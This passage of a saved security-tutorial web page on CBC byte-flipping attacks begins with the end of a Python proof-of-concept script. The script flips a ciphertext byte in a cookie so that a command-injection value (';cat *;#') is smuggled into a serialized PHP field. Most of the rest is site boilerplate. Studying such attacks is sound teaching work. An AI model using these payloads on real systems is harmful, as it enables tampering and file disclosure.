dec(urllib.unquote_plus(h[</code><code class="php string">'set-cookie'</code><code class="php plain">][9:]))</code></div><div class="line number35 index34 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">#h = urllib.unquote_plus(h[</code><code class="php string">'set-cookie'</code><code class="php plain">][9:])</code></div><div class="line number36 index35 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">#</code><code class="php functions">print</code> <code class="php plain">h</code></div><div class="line number37 index36 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php plain">h</code></div><div class="line number38 index37 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">else</code><code class="php plain">:</code></div><div class="line number39 index38 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">print</code> <code class="php string">'[-] ERROR'</code></div><div class="line number40 index39 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">sys.</code><code class="php functions">exit</code><code class="php plain">(0)</code></div><div class="line number41 index40 alt2">&nbsp;</div><div class="line number42 index41 alt1"><code class="php plain">#a:2:{s:4:</code><code class="php string">"name"</code><code class="php plain">;s:10:</code><code class="php string">"X;cat *;#a"</code><code class="php plain">;s:8:</code><code class="php string">"greeting"</code><code class="php plain">;s:24:</code><code class="php string">"echo 'Hello X;cat *;#a!'"</code><code class="php plain">;}</code></div><div class="line number43 index42 alt2"><code class="php plain">#a:2:{s:4:</code><code class="php string">"name"</code><code class="php plain">;</code></div><div class="line number44 index43 alt1"><code class="php plain">#s:10:"X;cat *;#a</code></div><div class="line number45 index44 alt2"><code class="php plain">#</code><code class="php string">";s:8:"</code><code class="php plain">greeting"</code></div><div class="line number46 index45 alt1"><code class="php plain">#;s:24:"</code><code class="php functions">echo</code> <code class="php plain">'Hel</code></div><div class="line number47 index46 alt2"><code class="php plain">#lo X;cat *;#a!'"</code></div><div class="line number48 index47 alt1"><code class="php plain">#;}</code></div><div class="line number49 index48 alt2">&nbsp;</div><div class="line number50 index49 alt1"><code class="php plain">#a:2:{s:4:</code><code class="php string">"name"</code><code class="php plain">;s:42:</code><code class="php string">"zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz"</code><code class="php plain">;s:8:</code><code class="php string">"greeting"</code><code class="php plain">;s:56:</code><code class="php string">"echo 'Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!'"</code><code class="php plain">;}</code></div><div class="line number51 index50 alt2"><code class="php plain">#a:2:{s:4:</code><code class="php string">"name"</code><code class="php plain">;</code></div><div class="line number52 index51 alt1"><code class="php plain">#s:42:"zzzzzzzzzz</code></div><div class="line number53 index52 alt2"><code class="php plain">#zzzzzzzX;cat *;#</code></div><div class="line number54 index53 alt1"><code class="php plain">#zzzzzzzzzzzzzzzz</code></div><div class="line number55 index54 alt2"><code class="php plain">#</code><code class="php string">";s:8:"</code><code class="php plain">greeting"</code></div><div class="line number56 index55 alt1"><code class="php plain">#;s:56:"</code><code class="php functions">echo</code> <code class="php plain">'Hel</code></div><div class="line number57 index56 alt2"><code class="php plain">#lo zzzzzzzzzzzzz</code></div><div class="line number58 index57 alt1"><code class="php plain">#zzzzX;cat *;#zzz</code></div><div class="line number59 index58 alt2"><code class="php plain">#zzzzzzzzzzzzz!'"</code></div><div class="line number60 index59 alt1"><code class="php plain">#;}</code></div><div class="line number61 index60 alt2"><code class="php plain">#exploit = </code><code class="php string">'X'</code> <code class="php plain">+ </code><code class="php string">';cat *;#a'</code> <code class="php plain">#Test </code><code class="php keyword">case</code> <code class="php plain">first, unsuccess</code></div><div class="line number62 index61 alt1"><code class="php plain">exploit = </code><code class="php string">'z'</code><code class="php plain">*17 + </code><code class="php string">'X'</code> <code class="php plain">+ </code><code class="php string">';cat *;#'</code> <code class="php plain">+ </code><code class="php string">'z'</code> <code class="php plain">*16 # Test Success</code></div><div class="line number63 index62 alt2">&nbsp;</div><div class="line number64 index63 alt1"><code class="php plain">#exploit = </code><code class="php string">"______________________________________________________; cat *;#"</code></div><div class="line number65 index64 alt2"><code class="php plain">#Test(exploit)</code></div><div class="line number66 index65 alt1"><code class="php plain">cookie = GetCookie(exploit)</code></div><div class="line number67 index66 alt2"><code class="php plain">pos = 100; #test </code><code class="php keyword">case</code> <code class="php plain">success</code></div><div class="line number68 index67 alt1"><code class="php plain">#pos = 51; #test </code><code class="php keyword">case</code> <code class="php plain">first, unsuccess</code></div><div class="line number69 index68 alt2"><code class="php plain">val = </code><code class="php functions">chr</code><code class="php plain">(ord(</code><code class="php string">'X'</code><code class="php plain">) ^ ord(</code><code class="php string">"'"</code><code class="php plain">) ^ ord(cookie[pos]))</code></div><div class="line number70 index69 alt1"><code class="php plain">exploit = cookie[0:pos] + val + cookie[pos + 1:]</code></div><div class="line number71 index70 alt2"><code class="php plain">Pwn(exploit)</code></div></div></td></tr></tbody></table></div></div>
+<!--
+ADINJ DEBUG
+Ad Injection in-content injections complete!
+No top ad defined in any of the ad code boxes
+No bottom ad defined in any of the ad code boxes
+Content length=2017 (words) Raw character length=20407 Paragraph count=76
+Top ad paragraph: -1
+Bottom ad paragraph: -1
+1st Injected random ads range starts at: 21, and ends at: 76
+2nd Injected random ads range starts at: 21, and ends at: 76
+potential_random_ad_paragraphs:56
+Only 1 random ad because post length < 2500
+requested_num_rand_ads_to_insert:1
+Injected ads at: 60 
+$adinj_total_top_ads_used=0
+$adinj_total_random_ads_used=1
+$adinj_total_bottom_ads_used=0
+random ads start=at or after - character - 3000
+random ads end=anywhere - paragraph - 20 fromstart
+posttype=post ( single)
+currentdate=1395468359 (16151.2541551)
+postdate=1377155410 (15939.2987269)
+injection mode=direct
+-->
+							</div>
+						<div class="meta-info">
+				<div class="alignleft">
+					By <a href="http://resources.infosecinstitute.com/author/daniel-regalado/" title="Posts by Daniel Regalado" rel="author">Daniel Regalado</a><span class="sep">|</span>August 22nd, 2013<span class="sep">|</span><a href="http://resources.infosecinstitute.com/category/hacking-2/" title="View all posts in Hacking" rel="category tag">Hacking</a><span class="sep">|</span><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#respond" title="Comment on CBC Byte Flipping Attack—101 Approach">0 Comments</a>				</div>
+			</div>
+									<div class="share-box">
+				<h4>Share This Story, Choose Your Platform!</h4>
+				<ul class="social-networks">
+										<li class="facebook">
+						<a href="http://www.facebook.com/sharer.php?u=http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&t=CBC%20Byte%20Flipping%20Attack%E2%80%94101%20Approach">
+							Facebook
+						</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Facebook</p>
+							</div>
+						</div>
+					</li>
+															<li class="twitter">
+						<a href="http://twitter.com/home?status=CBC%20Byte%20Flipping%20Attack%E2%80%94101%20Approach%20http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/">
+							Twitter
+						</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Twitter</p>
+							</div>
+						</div>
+					</li>
+															<li class="linkedin">
+						<a href="http://linkedin.com/shareArticle?mini=true&url=http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&title=CBC%20Byte%20Flipping%20Attack%E2%80%94101%20Approach">
+							LinkedIn
+						</a>
+						<div class="popup">
+							<div class="holder">
+								<p>LinkedIn</p>
+							</div>
+						</div>
+					</li>
+															<li class="reddit">
+						<a href="http://reddit.com/submit?url=http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&title=CBC%20Byte%20Flipping%20Attack%E2%80%94101%20Approach">
+							Reddit
+						</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Reddit</p>
+							</div>
+						</div>
+					</li>
+															<li class="tumblr">
+						<a href="http://www.tumblr.com/share/link?url=http%3A%2F%2Fresources.infosecinstitute.com%2Fcbc-byte-flipping-attack-101-approach%2F&name=CBC+Byte+Flipping+Attack%E2%80%94101+Approach&description=%3C!--adinj%20Ad%20Injection%20debug%20mode%20on--%3E%3C!--ADINJ%20DEBUG:%20picked%20value%20at%20position%200:%20ad_code_random_1--%3E%3C!--ADINJ%20DEBUG:%20picked%20value%20at%20position%200:%20ad_code_random_1--%3EAs+usual%2C+there+are+some+explanations+about+this+attack+out+there+%28see+references+at+the+end%29%2C+but+some+knowledge+is+required+to+understand+it+properly%2C+so+here+I+will+describe%2C+step+by+step%2C+how+to+perform+this+attack.+Purpose+of+the+Attack%3A+To+change+a+byte+in+the+plaintext+by+%5B...%5D">
+							Tumblr
+						</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Tumblr</p>
+							</div>
+						</div>
+					</li>
+															<li class="google">
+						<a href="http://google.com/bookmarks/mark?op=edit&bkmk=http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&title=CBC%20Byte%20Flipping%20Attack%E2%80%94101%20Approach">
+							Google +1
+						</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Google +1</p>
+							</div>
+						</div>
+					</li>
+															<li class="email">
+						<a href="mailto:?subject=CBC%20Byte%20Flipping%20Attack%E2%80%94101%20Approach&body=http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/">
+							Email
+						</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Email</p>
+							</div>
+						</div>
+					</li>
+									</ul>
+			</div>
+									<div class="about-author">
+				<div class="title"><h2>About the Author: <a href="http://resources.infosecinstitute.com/author/daniel-regalado/" title="Posts by Daniel Regalado" rel="author">Daniel Regalado</a></h2></div>
+				<div class="about-author-container">
+					<div class="avatar">
+						<img alt="" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/e0dc9a7890f095df16904cb0d1a367cc" class="avatar avatar-72 photo" height="72" width="72">					</div>
+					<div class="description">
+						Daniel Regalado aka Danux is a security enthusiast with more than 10 years of experience on the field. His main focus is on Malware and Vulnerability Research; you can reach him either via email danuxx [at] gmail.com or his blog site: http://danuxx.blogspot.com/					</div>
+				</div>
+			</div>
+			
+			
+												
+<!-- You can start editing here. -->
+
+
+			<!-- If comments are open, but there are no comments. -->
+
+	 
+
+
+<div id="respond" class="section">
+	<div>
+	<div class="title"><h2>Leave A Comment</h2></div>
+	<div>
+
+	<div><p class="cancel-comment-reply"><a rel="nofollow" id="cancel-comment-reply-link" href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#respond" style="display:none;">Click here to cancel reply.</a></p></div>
+
+	
+	<form action="http://resources.infosecinstitute.com/wp-comments-post.php" method="post">
+
+		
+		<div id="comment-input">
+
+			<input type="text" name="author" id="author" value="" placeholder="Name (required)" size="22" tabindex="1" aria-required="true" class="input-name">
+
+			<input type="text" name="email" id="email" value="" placeholder="Email (required)" size="22" tabindex="2" aria-required="true" class="input-email">
+		
+			<input type="text" name="url" id="url" value="" placeholder="Website" size="22" tabindex="3" class="input-website">
+			
+		</div>
+		
+		<div id="comment-textarea">
+			
+			<textarea name="comment" id="comment" cols="39" rows="4" tabindex="4" class="textarea-comment" placeholder="Comment..."></textarea>
+		
+		</div>
+		
+		<div id="comment-submit">
+		
+			<p></p><div><input name="submit" type="submit" id="submit" tabindex="5" value="Post Comment" class="comment-submit small button green"></div><p></p>
+			<input type="hidden" name="comment_post_ID" value="20700" id="comment_post_ID">
+<input type="hidden" name="comment_parent" id="comment_parent" value="0">
+			<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="36f58a0afd"></p><p class="cptch_block"><br>		<input type="hidden" name="cptch_result" value="V0kx">
+		<input type="hidden" name="cptch_time" value="1395468359">
+		<input type="hidden" value="Version: 2.4">
+		seven × 4 =  <input id="cptch_input" type="text" autocomplete="off" name="cptch_number" value="" maxlength="2" size="2" aria-required="true" required="required" style="margin-bottom:0;display:inline;font-size: 12px;width: 40px;">	</p>			
+		</div>
+
+		
+	</form>
+
+		</div>
+	</div>
+</div>
+
+					</div>
+			</div>
+	<div id="sidebar" style="position: absolute; left: 720px; top: 7207px;">
+    
+    
+	
+	<div id="text-4" class="widget widget_text" style="position: relative;">
+        <div class="textwidget">
+            <div class="greensidebar">
+                <div class="green_title_bar">
+                    <h2>Related Mini Courses</h2>
+                </div>
+                <ul>
+                	<li><i class="medium circle-no icon-desktop singlewidgeticon"></i><a href="http://resources.infosecinstitute.com/mini-courses/">View All Mini Courses</a></li><li><i class="medium circle-no icon-desktop singlewidgeticon"></i><a href="http://www.infosecinstitute.com/courses/online-training.html">Full Length Online Courses</a></li>                </ul>
+                            </div>
+        </div>
+	</div>    
+    	
+	<div id="text-4" class="widget widget_text" style="position: relative;">
+        <div class="textwidget">
+            <div class="bluesidebar">
+                <div class="blue_title_bar">
+                    <h2>Related Boot Camps</h2>
+                </div>
+                <ul>
+                <li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/security.html">Information Security</a></li><li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/information-assurance.html">Information Assurance</a></li><li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/it-audit.html">IT Audit</a></li><li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/microsoft-training.html">Microsoft</a></li><li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/8570-training.html">Cisco</a></li><li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/secure-coding.html">CompTIA</a></li><li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/linux_security_training.html">Linux</a></li><li><span class="infosecicon"></span><a href="http://www.infosecinstitute.com/courses/project-management.html">Project Management</a></li>	
+                </ul>
+                            </div>
+        </div>
+	</div>
+	
+	
+	<div id="text-3" class="widget widget_text" style="position: relative;">			<div class="textwidget"><div class="accordian"><h5 class="toggle active"><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#"><span class="arrow"></span>About the Author</a></h5><div class="toggle-content default-open" style="display: block;"><div class="wpf_author_widget_holder"><div class="wpf_author_name_widget"><h5><a href="http://resources.infosecinstitute.com/author/daniel-regalado/">Daniel Regalado</a></h5></div><div class="wpf_author_pic_widget"><img alt="" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/e0dc9a7890f095df16904cb0d1a367cc(1)" class="avatar avatar-50 photo" height="50" width="50"></div><p>Daniel Regalado aka Danux is a security enthusiast with more than 10 years of experience on the field. His main focus is on Malware and Vulnerability Research; you can reach him either via email danuxx [at] gmail.com or his blog site: http://danuxx.blogspot.com/</p></div></div>
+
+<h5 class="toggle "><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#"><span class="arrow"></span>Other Articles by the author</a></h5><div class="toggle-content " style="display: none;"><ul></ul></div></div>
+
+
+</div>
+		</div><div id="search-3" class="widget widget_search" style="position: relative;"><div class="heading"><h3>Search</h3></div><form class="search" action="http://resources.infosecinstitute.com/" method="get">
+	<fieldset>
+		<span class="text"><input name="s" id="s" type="text" value="" placeholder="Search ..."></span>
+	</fieldset>
+</form></div><div id="categories-4" class="widget widget_categories" style="position: relative;"><div class="heading"><span style="position:absolute;"><strong>+</strong></span><h3 style="padding-left: 15px;">Categories</h3></div>		<ul style="display: none;">
+	<li class="cat-item cat-item-117"><a href="http://resources.infosecinstitute.com/category/application-security-2/" title="View all posts filed under Application Security">Application Security</a>
+</li>
+	<li class="cat-item cat-item-125"><a href="http://resources.infosecinstitute.com/category/certifications-training/ccna-certification/" title="The content in this category is meant to help students with their CCNA Certification.
+
+InfoSec Institute and Intense School have offerings for CCNA prep.">CCNA</a>
+</li>
+	<li class="cat-item cat-item-124"><a href="http://resources.infosecinstitute.com/category/certifications-training/ceh/" title="The CEH is Certified Ethical Hacker from EC-Council. Most of the CEH content below is to help with exam preparation. ">CEH</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="http://resources.infosecinstitute.com/category/certifications-training/cisa/" title="View all posts filed under CISA">CISA</a>
+</li>
+	<li class="cat-item cat-item-29"><a href="http://resources.infosecinstitute.com/category/certifications-training/cism/" title="View all posts filed under CISM">CISM</a>
+</li>
+	<li class="cat-item cat-item-23"><a href="http://resources.infosecinstitute.com/category/certifications-training/cissp/" title="The CISSP has become the most popular of IT security certifications. We&#39;ve covered the CISSP very in-depth, with some outstanding articles below by Ken Magee. If you&#39;re interested in CISSP training you can find more about the class on InfoSec Institute">CISSP</a>
+</li>
+	<li class="cat-item cat-item-612"><a href="http://resources.infosecinstitute.com/category/exploit-development/" title="View all posts filed under Exploit Development">Exploit Development</a>
+</li>
+	<li class="cat-item cat-item-115"><a href="http://resources.infosecinstitute.com/category/forensics-2/" title="Computer Forensics is one of the hottest subject areas in our articles, mini-courses, and forensics boot camps. If you or your organization needs classroom or online computer forensics training, call an account representative at 877-471-0059.">Forensics</a>
+</li>
+	<li class="cat-item cat-item-177"><a href="http://resources.infosecinstitute.com/category/general-security-2/" title="View all posts filed under General Security">General Security</a>
+</li>
+	<li class="cat-item cat-item-114"><a href="http://resources.infosecinstitute.com/category/hacking-2/" title="Hacking and Penetration Testing is the core topic here at InfoSec Institute. A wealth of free training materials is here &amp; we continue to write and publish them daily. If you or your organization needs classroom or online ethical hacking training and education, give us a look!">Hacking</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://resources.infosecinstitute.com/category/interviews/" title="View all posts filed under Interviews">Interviews</a>
+</li>
+	<li class="cat-item cat-item-119"><a href="http://resources.infosecinstitute.com/category/certifications-training/" title="This section contains articles about IT Certifications. We run a series of &#39;Demystifying&#39; articles that cover the most popular IT Certifications and go in-depth into what you need to know to pass the test. Read the articles - then take a class with us!">IT Certifications</a>
+</li>
+	<li class="cat-item cat-item-650"><a href="http://resources.infosecinstitute.com/category/malware-analysis/" title="View all posts filed under Malware Analysis">Malware Analysis</a>
+</li>
+	<li class="cat-item cat-item-118"><a href="http://resources.infosecinstitute.com/category/compliance-auditing/" title="View all posts filed under Management, Compliance, &amp; Auditing">Management, Compliance, &amp; Auditing</a>
+</li>
+	<li class="cat-item cat-item-126"><a href="http://resources.infosecinstitute.com/category/certifications-training/mcitp/" title="View all posts filed under MCITP">MCITP</a>
+</li>
+	<li class="cat-item cat-item-649"><a href="http://resources.infosecinstitute.com/category/meta/" title="View all posts filed under Meta">Meta</a>
+</li>
+	<li class="cat-item cat-item-120"><a href="http://resources.infosecinstitute.com/category/other/" title="View all posts filed under Other">Other</a>
+</li>
+	<li class="cat-item cat-item-116"><a href="http://resources.infosecinstitute.com/category/reverse-engineering-2/" title="View all posts filed under Reverse Engineering">Reverse Engineering</a>
+</li>
+	<li class="cat-item cat-item-123"><a href="http://resources.infosecinstitute.com/category/scada-2/" title="View all posts filed under SCADA">SCADA</a>
+</li>
+	<li class="cat-item cat-item-175"><a href="http://resources.infosecinstitute.com/category/virtualization-security/" title="View all posts filed under Virtualization Security">Virtualization Security</a>
+</li>
+	<li class="cat-item cat-item-176"><a href="http://resources.infosecinstitute.com/category/wireless-security/" title="View all posts filed under Wireless Security">Wireless Security</a>
+</li>
+		</ul>
+</div><div id="facebook-like-widget-7" class="widget facebook_like" style="position: relative;"><div class="heading"><h3>Find us on Facebook</h3></div>		<iframe src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/likebox(1).htm" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:220px; height: 240px;" allowtransparency="true"></iframe>
+		</div>		</div>
+		</div>
+	</div>
+			<footer class="footer-area">
+		<div class="avada-row">
+			<section class="columns columns-4">
+				<article class="col">
+				<div id="archives-2" class="footer-widget-col widget_archive"><h3>Archives</h3>		<select name="archive-dropdown" onchange="document.location.href=this.options[this.selectedIndex].value;"> <option value="">Select Month</option> 	<option value="http://resources.infosecinstitute.com/2014/03/"> March 2014 &nbsp;(25)</option>
+	<option value="http://resources.infosecinstitute.com/2014/02/"> February 2014 &nbsp;(39)</option>
+	<option value="http://resources.infosecinstitute.com/2014/01/"> January 2014 &nbsp;(48)</option>
+	<option value="http://resources.infosecinstitute.com/2013/12/"> December 2013 &nbsp;(44)</option>
+	<option value="http://resources.infosecinstitute.com/2013/11/"> November 2013 &nbsp;(41)</option>
+	<option value="http://resources.infosecinstitute.com/2013/10/"> October 2013 &nbsp;(45)</option>
+	<option value="http://resources.infosecinstitute.com/2013/09/"> September 2013 &nbsp;(39)</option>
+	<option value="http://resources.infosecinstitute.com/2013/08/"> August 2013 &nbsp;(42)</option>
+	<option value="http://resources.infosecinstitute.com/2013/07/"> July 2013 &nbsp;(44)</option>
+	<option value="http://resources.infosecinstitute.com/2013/06/"> June 2013 &nbsp;(38)</option>
+	<option value="http://resources.infosecinstitute.com/2013/05/"> May 2013 &nbsp;(42)</option>
+	<option value="http://resources.infosecinstitute.com/2013/04/"> April 2013 &nbsp;(55)</option>
+	<option value="http://resources.infosecinstitute.com/2013/03/"> March 2013 &nbsp;(68)</option>
+	<option value="http://resources.infosecinstitute.com/2013/02/"> February 2013 &nbsp;(65)</option>
+	<option value="http://resources.infosecinstitute.com/2013/01/"> January 2013 &nbsp;(65)</option>
+	<option value="http://resources.infosecinstitute.com/2012/12/"> December 2012 &nbsp;(51)</option>
+	<option value="http://resources.infosecinstitute.com/2012/11/"> November 2012 &nbsp;(45)</option>
+	<option value="http://resources.infosecinstitute.com/2012/10/"> October 2012 &nbsp;(58)</option>
+	<option value="http://resources.infosecinstitute.com/2012/09/"> September 2012 &nbsp;(56)</option>
+	<option value="http://resources.infosecinstitute.com/2012/08/"> August 2012 &nbsp;(35)</option>
+	<option value="http://resources.infosecinstitute.com/2012/07/"> July 2012 &nbsp;(21)</option>
+	<option value="http://resources.infosecinstitute.com/2012/06/"> June 2012 &nbsp;(31)</option>
+	<option value="http://resources.infosecinstitute.com/2012/05/"> May 2012 &nbsp;(11)</option>
+	<option value="http://resources.infosecinstitute.com/2012/04/"> April 2012 &nbsp;(16)</option>
+	<option value="http://resources.infosecinstitute.com/2012/03/"> March 2012 &nbsp;(12)</option>
+	<option value="http://resources.infosecinstitute.com/2012/02/"> February 2012 &nbsp;(24)</option>
+	<option value="http://resources.infosecinstitute.com/2012/01/"> January 2012 &nbsp;(21)</option>
+	<option value="http://resources.infosecinstitute.com/2011/12/"> December 2011 &nbsp;(15)</option>
+	<option value="http://resources.infosecinstitute.com/2011/11/"> November 2011 &nbsp;(12)</option>
+	<option value="http://resources.infosecinstitute.com/2011/10/"> October 2011 &nbsp;(12)</option>
+	<option value="http://resources.infosecinstitute.com/2011/09/"> September 2011 &nbsp;(1)</option>
+	<option value="http://resources.infosecinstitute.com/2011/08/"> August 2011 &nbsp;(2)</option>
+	<option value="http://resources.infosecinstitute.com/2011/07/"> July 2011 &nbsp;(7)</option>
+	<option value="http://resources.infosecinstitute.com/2011/06/"> June 2011 &nbsp;(22)</option>
+	<option value="http://resources.infosecinstitute.com/2011/05/"> May 2011 &nbsp;(30)</option>
+	<option value="http://resources.infosecinstitute.com/2011/04/"> April 2011 &nbsp;(33)</option>
+	<option value="http://resources.infosecinstitute.com/2011/03/"> March 2011 &nbsp;(24)</option>
+	<option value="http://resources.infosecinstitute.com/2011/02/"> February 2011 &nbsp;(7)</option>
+	<option value="http://resources.infosecinstitute.com/2011/01/"> January 2011 &nbsp;(2)</option>
+	<option value="http://resources.infosecinstitute.com/2010/12/"> December 2010 &nbsp;(3)</option>
+	<option value="http://resources.infosecinstitute.com/2010/11/"> November 2010 &nbsp;(7)</option>
+	<option value="http://resources.infosecinstitute.com/2010/10/"> October 2010 &nbsp;(1)</option>
+	<option value="http://resources.infosecinstitute.com/2010/09/"> September 2010 &nbsp;(1)</option>
+	<option value="http://resources.infosecinstitute.com/2010/08/"> August 2010 &nbsp;(4)</option>
+	<option value="http://resources.infosecinstitute.com/2010/07/"> July 2010 &nbsp;(2)</option>
+ </select>
+<div style="clear:both;"></div></div><div id="tag_cloud-2" class="footer-widget-col widget_tag_cloud"><h3>Popular Search Terms</h3><div class="tagcloud"><a href="http://resources.infosecinstitute.com/tag/agile/" class="tag-link-306" title="8 topics" style="font-size: 9.0625pt;">agile</a>
+<a href="http://resources.infosecinstitute.com/tag/android/" class="tag-link-65" title="12 topics" style="font-size: 10.0625pt;">android</a>
+<a href="http://resources.infosecinstitute.com/tag/application-security/" class="tag-link-88" title="87 topics" style="font-size: 15.25pt;">application security</a>
+<a href="http://resources.infosecinstitute.com/tag/app-security/" class="tag-link-632" title="6 topics" style="font-size: 8.4375pt;">App Security</a>
+<a href="http://resources.infosecinstitute.com/tag/bootcamp/" class="tag-link-6" title="13 topics" style="font-size: 10.3125pt;">bootcamp</a>
+<a href="http://resources.infosecinstitute.com/tag/certifications/" class="tag-link-24" title="5 topics" style="font-size: 8pt;">certifications</a>
+<a href="http://resources.infosecinstitute.com/tag/cisa/" class="tag-link-10" title="10 topics" style="font-size: 9.625pt;">CISA</a>
+<a href="http://resources.infosecinstitute.com/tag/cism/" class="tag-link-29" title="8 topics" style="font-size: 9.0625pt;">CISM</a>
+<a href="http://resources.infosecinstitute.com/tag/cissp/" class="tag-link-23" title="30 topics" style="font-size: 12.4375pt;">CISSP</a>
+<a href="http://resources.infosecinstitute.com/tag/compliance/" class="tag-link-141" title="7 topics" style="font-size: 8.75pt;">compliance</a>
+<a href="http://resources.infosecinstitute.com/tag/crackme/" class="tag-link-334" title="7 topics" style="font-size: 8.75pt;">crackme</a>
+<a href="http://resources.infosecinstitute.com/tag/ethical-hacking/" class="tag-link-40" title="12 topics" style="font-size: 10.0625pt;">ethical hacking</a>
+<a href="http://resources.infosecinstitute.com/tag/exploit-development-2/" class="tag-link-635" title="8 topics" style="font-size: 9.0625pt;">exploit development</a>
+<a href="http://resources.infosecinstitute.com/tag/feature/" class="tag-link-121" title="1,041 topics" style="font-size: 22pt;">feature</a>
+<a href="http://resources.infosecinstitute.com/tag/featured-2/" class="tag-link-135" title="14 topics" style="font-size: 10.5pt;">featured</a>
+<a href="http://resources.infosecinstitute.com/tag/forensics/" class="tag-link-34" title="61 topics" style="font-size: 14.3125pt;">forensics</a>
+<a href="http://resources.infosecinstitute.com/tag/general-security/" class="tag-link-33" title="168 topics" style="font-size: 17.0625pt;">general security</a>
+<a href="http://resources.infosecinstitute.com/tag/hacking/" class="tag-link-16" title="243 topics" style="font-size: 18.0625pt;">hacking</a>
+<a href="http://resources.infosecinstitute.com/tag/how-to/" class="tag-link-14" title="6 topics" style="font-size: 8.4375pt;">how-to</a>
+<a href="http://resources.infosecinstitute.com/tag/human-resources/" class="tag-link-340" title="6 topics" style="font-size: 8.4375pt;">human resources</a>
+<a href="http://resources.infosecinstitute.com/tag/infosecdocs/" class="tag-link-9" title="7 topics" style="font-size: 8.75pt;">infosecdocs</a>
+<a href="http://resources.infosecinstitute.com/tag/interview/" class="tag-link-204" title="21 topics" style="font-size: 11.5pt;">interview</a>
+<a href="http://resources.infosecinstitute.com/tag/iphone/" class="tag-link-132" title="6 topics" style="font-size: 8.4375pt;">iphone</a>
+<a href="http://resources.infosecinstitute.com/tag/it-auditing/" class="tag-link-36" title="16 topics" style="font-size: 10.8125pt;">IT Auditing</a>
+<a href="http://resources.infosecinstitute.com/tag/java/" class="tag-link-127" title="9 topics" style="font-size: 9.375pt;">java</a>
+<a href="http://resources.infosecinstitute.com/tag/linux/" class="tag-link-210" title="6 topics" style="font-size: 8.4375pt;">linux</a>
+<a href="http://resources.infosecinstitute.com/tag/malware/" class="tag-link-5" title="21 topics" style="font-size: 11.5pt;">malware</a>
+<a href="http://resources.infosecinstitute.com/tag/malware-analysis-2/" class="tag-link-651" title="6 topics" style="font-size: 8.4375pt;">malware analysis</a>
+<a href="http://resources.infosecinstitute.com/tag/management/" class="tag-link-142" title="9 topics" style="font-size: 9.375pt;">management</a>
+<a href="http://resources.infosecinstitute.com/tag/nmap/" class="tag-link-75" title="6 topics" style="font-size: 8.4375pt;">nmap</a>
+<a href="http://resources.infosecinstitute.com/tag/penetration-testing/" class="tag-link-61" title="15 topics" style="font-size: 10.625pt;">penetration testing</a>
+<a href="http://resources.infosecinstitute.com/tag/reverse-engineering/" class="tag-link-11" title="106 topics" style="font-size: 15.8125pt;">reverse engineering</a>
+<a href="http://resources.infosecinstitute.com/tag/reversing/" class="tag-link-12" title="14 topics" style="font-size: 10.5pt;">reversing</a>
+<a href="http://resources.infosecinstitute.com/tag/scada/" class="tag-link-79" title="7 topics" style="font-size: 8.75pt;">scada</a>
+<a href="http://resources.infosecinstitute.com/tag/security/" class="tag-link-35" title="57 topics" style="font-size: 14.125pt;">security</a>
+<a href="http://resources.infosecinstitute.com/tag/security-awareness/" class="tag-link-32" title="8 topics" style="font-size: 9.0625pt;">security awareness</a>
+<a href="http://resources.infosecinstitute.com/tag/social-media/" class="tag-link-190" title="7 topics" style="font-size: 8.75pt;">social media</a>
+<a href="http://resources.infosecinstitute.com/tag/sql-injection/" class="tag-link-74" title="12 topics" style="font-size: 10.0625pt;">sql injection</a>
+<a href="http://resources.infosecinstitute.com/tag/tor/" class="tag-link-157" title="9 topics" style="font-size: 9.375pt;">TOR</a>
+<a href="http://resources.infosecinstitute.com/tag/training/" class="tag-link-7" title="7 topics" style="font-size: 8.75pt;">training</a>
+<a href="http://resources.infosecinstitute.com/tag/video/" class="tag-link-43" title="5 topics" style="font-size: 8pt;">video</a>
+<a href="http://resources.infosecinstitute.com/tag/vulnerabilities/" class="tag-link-41" title="11 topics" style="font-size: 9.875pt;">vulnerabilities</a>
